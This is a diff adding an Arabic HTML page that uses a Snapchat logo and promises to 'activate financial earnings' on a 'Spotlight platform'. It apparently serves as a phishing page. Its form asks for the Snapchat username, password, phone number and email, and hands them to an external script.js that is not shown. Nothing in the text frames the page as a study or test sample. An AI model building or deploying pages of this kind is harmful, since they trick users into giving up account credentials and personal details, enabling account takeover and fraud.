@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة الأضواء - تفعيل المكاسب</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="container">
+        <img src="logo.png" alt="Snapchat Logo" class="logo">
+        <h1 class="title">منصة الأضواء</h1>
+        <p class="subtitle">تفعيل المكاسب المالية</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">اسم المستخدم</label>
+                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+            </div>
+
+            <div class="input-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="text" id="phone" placeholder="أدخل رقم الهاتف" required>
+            </div>
+
+            <div class="input-group">
+                <label for="email">البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+            </div>
+
+            <button type="submit" class="submit-btn">تفعيل المكاسب</button>
+        </form>
+
+        <p id="message" class="hidden"></p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
